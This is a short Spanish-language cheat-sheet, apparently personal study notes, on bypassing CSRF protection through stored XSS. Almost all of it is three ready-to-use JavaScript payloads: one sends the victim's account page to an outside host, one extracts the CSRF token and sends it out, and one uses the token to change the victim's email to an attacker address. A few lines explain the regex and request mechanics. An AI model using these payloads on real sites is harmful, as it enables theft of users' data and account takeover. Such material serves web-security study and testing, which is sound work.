# Evasión de CSRF usando XSS almacenado 

Tags: #XSS  #JavaScript #CSRF 

```javascript 
// Hacer una solicitud para despues por medio de Regex filtrar el valor del CSRF token 

	//PoC1
	<script>
		var request = new XMLHttpRequest();          // Permite lanzar peticiones por GET o POST 
		request.open("GET", "/my-account", false);   // Indicar si la ruta es sincrona = false o asincrona = true 
		request.send(); 
		var response = request.responseText;
		var request2 = new XMLHttpRequest();
		request2.open("GET", "https://website.com?response=" + btoa(response));
		request2.send();
	</script>


	//PoC2 para obtener el CSRF token
	<script>
		var request = new XMLHttpRequest();          // Permite lanzar peticiones por GET o POST 
		request.open("GET", "/my-account", false);   // Indicar si la ruta es sincrona = false o asincrona = true 
		request.send(); 
		var response = request.responseText;
		var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1]; // El 1 indica quedarse con el segundo elemento 
		var request2 = new XMLHttpRequest();
		request2.open("GET", "https://website.com?token=" + csrf_token);
		request2.send();
	</script>


		//PoC3 para cambiar el correo 
	<script>
		var request = new XMLHttpRequest();          // Permite lanzar peticiones por GET o POST 
		request.open("GET", "/my-account", false);   
		request.send(); 
		var response = request.responseText;
		var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];
		var request2 = new XMLHttpRequest();
		request2.open('POST', '/my-account/change-email', true);
		request2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");  // Colocar una cabecera para envio con POST 
		var data = "email=" + encodeURIComponent("pwned@pwned.com") + "&csrf=" + encodeURIComponent(csrf_token);
		request2.send(data);
	</script>


Notas:
	1. Cuando es sincrona es necesario que la solicitud se envie y que no continue con el resto de las ejecuciones hasta que sea recibida 
	2. En regex para indicar que quieres quedarte con un campo, se deb de colocar de la siguiente manera: (.*?)
	3. EncodeURIComponent permite urlencodear la cadena 
```